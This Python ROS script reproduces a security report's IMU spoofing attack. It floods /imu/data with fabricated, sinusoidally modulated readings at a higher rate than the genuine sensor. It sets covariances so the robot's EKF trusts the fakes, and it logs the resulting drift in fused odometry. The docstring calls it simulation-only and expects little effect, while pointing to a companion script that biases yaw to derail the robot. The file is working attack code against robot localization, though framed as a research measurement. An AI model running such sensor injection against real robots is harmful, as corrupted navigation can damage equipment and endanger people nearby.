#!/usr/bin/env python3
"""LITERAL reproduction of the security report's "IMU Data Spoofing" (§3).

  *** SIMULATION-ONLY SECURITY DEMONSTRATION. No real robot is involved. ***

Verbatim reproduction of report §3: publish sensor_msgs/Imu onto /imu/data with
IMPOSSIBLE readings -- angular velocity ~10 rad/s (~573 deg/s) and linear
acceleration ~50 m/s^2 (>5g) -- SINUSOIDALLY MODULATED to create "persistent
oscillating disturbances that confound sensor fusion" (report's language), at a
rate above the genuine 50 Hz hector IMU plugin.

WHY THIS IS EXPECTED TO HAVE LITTLE EFFECT ON THIS ROBOT (honest negative result)
--------------------------------------------------------------------------------
The stock EKF (husky_control/config/localization.yaml) fuses IMU orientation and
angular velocity but NOT linear acceleration (imu0_config accel indices false),
and uses imu0_differential: true -- it integrates the CHANGE in fused orientation
between messages. So (a) the report's headline ~50 m/s^2 accel is dropped
entirely, and (b) sinusoidally OSCILLATING angular values largely cancel under
differential integration + two_d_mode. The report's literal attack is therefore
expected to barely perturb /odometry/filtered here. This script MEASURES that.
(To actually derail, spoof a COHERENT yaw-rate bias -- see attack_imu_derail.py.)

Wiring verified against the stock topology; NOT run live end-to-end here.
"""

import argparse
import csv
import math
import threading
import time

import rospy
from sensor_msgs.msg import Imu
from nav_msgs.msg import Odometry


# ---------------------------------------------------------------------------
# Report §3 exact payload, as named constants so the banner/CSV can echo them.
# ---------------------------------------------------------------------------
REPORT_ANGULAR_VEL = 10.0   # rad/s (~573 deg/s) -- report's headline
REPORT_LINEAR_ACC = 50.0    # m/s^2 (>5g)        -- report's headline
SINUSOID_HZ = 1.0           # modulation frequency for the oscillating disturbance
IMU_FRAME_ID = "base_link"  # genuine hector plugin uses bodyName=base_link


class ImuFaithfulAttack(object):
    def __init__(self, args):
        self.args = args
        self._lock = threading.Lock()
        self._fused_xy_yaw = None   # (x, y, yaw) from /odometry/filtered
        self._baseline = None       # (x, y, yaw) captured pre-attack
        self._stop = threading.Event()
        self._start_wall = None

        # Publisher onto the genuine IMU topic. queue_size=1: always the freshest
        # fake message, never a backlog.
        self._pub = rospy.Publisher("/imu/data", Imu, queue_size=1)

        # Telemetry subscriber. We only READ this; the attack is the publish.
        # /odometry/filtered is this stock robot's fused EKF output.
        rospy.Subscriber("/odometry/filtered", Odometry, self._on_fused,
                         queue_size=1)

        # CSV: open once, write header, flush every row so a mid-run Ctrl-C
        # still leaves a complete, readable file.
        self._csv_file = open(args.csv, "w", newline="")
        self._csv = csv.writer(self._csv_file)
        self._csv.writerow(["elapsed_time", "fused_x", "fused_y", "fused_yaw",
                            "d_from_baseline_m", "d_yaw_from_baseline_rad"])
        self._csv_file.flush()

    # --- telemetry callback --------------------------------------------------
    def _on_fused(self, msg):
        from tf.transformations import euler_from_quaternion
        q = msg.pose.pose.orientation
        yaw = euler_from_quaternion([q.x, q.y, q.z, q.w])[2]
        with self._lock:
            self._fused_xy_yaw = (msg.pose.pose.position.x,
                                  msg.pose.pose.position.y, yaw)

    # --- the fabricated message ---------------------------------------------
    def _build_spoof(self, t):
        """One fake Imu per report §3: impossible values, sinusoidally modulated.
        Structurally valid (stamp, frame, unit quaternion, non-negative-1
        covariances) so the EKF accepts rather than rejects it."""
        s = math.sin(2.0 * math.pi * SINUSOID_HZ * t)
        msg = Imu()
        msg.header.stamp = rospy.Time.now()
        msg.header.frame_id = IMU_FRAME_ID
        msg.orientation.w = 1.0  # valid identity quaternion
        msg.angular_velocity.x = self.args.ang_vel * s
        msg.angular_velocity.y = self.args.ang_vel * s
        msg.angular_velocity.z = self.args.ang_vel * s
        msg.linear_acceleration.x = self.args.lin_acc * s
        msg.linear_acceleration.y = self.args.lin_acc * s
        msg.linear_acceleration.z = self.args.lin_acc * s
        # Non-(-1) covariance diagonals: -1 in [0] means "unset" and the EKF
        # would ignore that component. Small positive => "trust this".
        for cov in (msg.orientation_covariance, msg.angular_velocity_covariance,
                    msg.linear_acceleration_covariance):
            cov[0] = cov[4] = cov[8] = 0.01
        return msg

    # --- telemetry row -------------------------------------------------------
    def _log_row(self):
        with self._lock:
            cur = self._fused_xy_yaw
            base = self._baseline
        elapsed = time.time() - self._start_wall
        if cur is None:
            rospy.loginfo("[t=%6.1fs] waiting for /odometry/filtered ...", elapsed)
            return
        if base is None:
            with self._lock:
                self._baseline = cur
                base = cur
        d = math.hypot(cur[0] - base[0], cur[1] - base[1])
        dyaw = cur[2] - base[2]
        rospy.loginfo("[t=%6.1fs] fused=(%.3f,%.3f,yaw=%.3f) d_base=%.3fm dyaw=%.3f",
                      elapsed, cur[0], cur[1], cur[2], d, dyaw)
        self._csv.writerow(["%.3f" % elapsed, "%.4f" % cur[0], "%.4f" % cur[1],
                            "%.4f" % cur[2], "%.4f" % d, "%.4f" % dyaw])
        self._csv_file.flush()

    # --- main loop -----------------------------------------------------------
    def run(self):
        self._start_wall = time.time()
        rate = rospy.Rate(self.args.rate)
        next_log = self._start_wall + 1.0  # first telemetry row after 1 s

        rospy.loginfo(
            "ATTACK START (report §3 literal): spoofing /imu/data at %.1f Hz "
            "with impossible ang_vel=%.1f rad/s, lin_acc=%.1f m/s^2, "
            "sinusoidally modulated at %.1f Hz%s",
            self.args.rate, self.args.ang_vel, self.args.lin_acc, SINUSOID_HZ,
            (" for %.0f s" % self.args.duration)
            if self.args.duration > 0 else " until Ctrl-C")

        while not self._stop.is_set() and not rospy.is_shutdown():
            elapsed = time.time() - self._start_wall
            if self.args.duration > 0 and elapsed >= self.args.duration:
                rospy.loginfo("Duration reached -- stopping.")
                break

            self._pub.publish(self._build_spoof(elapsed))

            now = time.time()
            if now >= next_log:
                self._log_row()
                next_log += 1.0

            rate.sleep()

    def shutdown(self):
        """Stop publishing and close the CSV. Idempotent. NO corrective
        message is sent -- we just cease publishing and let the genuine hector
        IMU stream reassert itself."""
        self._stop.set()
        try:
            if not self._csv_file.closed:
                self._csv_file.flush()
                self._csv_file.close()
        except Exception as exc:  # noqa: BLE001 -- log, never hide
            rospy.logwarn("Error closing CSV: %s", exc)
        rospy.loginfo("ATTACK STOPPED. CSV saved to %s", self.args.csv)


def parse_args():
    p = argparse.ArgumentParser(
        description="Literal reproduction of the report's §3 IMU data spoofing "
                    "(impossible angular velocity + linear acceleration, "
                    "sinusoidally modulated).")
    p.add_argument("--rate", type=float, default=100.0,
                   help="publish rate in Hz (default 100; well above the "
                        "genuine 50 Hz hector IMU plugin)")
    p.add_argument("--duration", type=float, default=0.0,
                   help="seconds to run; 0 = until Ctrl-C (default 0)")
    p.add_argument("--csv", default="attack_imu_faithful.csv",
                   help="telemetry output CSV path "
                        "(default attack_imu_faithful.csv)")
    # The report's exact payload values as defaults. Exposed as knobs only for
    # tuning/experiments; leave at the defaults to reproduce the report exactly.
    p.add_argument("--ang-vel", type=float, default=REPORT_ANGULAR_VEL,
                   help="peak angular velocity magnitude in rad/s "
                        "(report default 10.0, ~573 deg/s)")
    p.add_argument("--lin-acc", type=float, default=REPORT_LINEAR_ACC,
                   help="peak linear acceleration magnitude in m/s^2 "
                        "(report default 50.0, >5g)")
    args = p.parse_args()
    if args.rate <= 0:
        p.error("--rate must be > 0")
    return args


def main():
    args = parse_args()
    # anonymous=True: multiple attacker instances (or reruns) must not collide
    # on a node name.
    rospy.init_node("attack_imu_faithful", anonymous=True)

    attack = ImuFaithfulAttack(args)
    rospy.on_shutdown(attack.shutdown)

    try:
        attack.run()
    except rospy.ROSInterruptException:
        pass
    finally:
        # on_shutdown may not fire on a clean duration exit -- ensure cleanup.
        attack.shutdown()


if __name__ == "__main__":
    main()
